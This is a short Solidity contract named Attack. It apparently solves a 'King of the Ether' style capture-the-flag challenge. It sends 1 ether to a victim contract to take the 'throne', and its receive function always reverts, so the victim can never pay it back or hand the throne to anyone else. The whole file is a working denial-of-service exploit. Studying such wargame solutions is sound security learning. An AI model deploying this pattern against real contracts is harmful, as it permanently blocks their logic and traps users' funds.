// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract Attack {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function run() external payable {
        require(msg.value == 1 ether, "please send exactly 1 ether");

        (bool success, ) = payable(address(victim)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "cannot claim my throne!");
    }
}
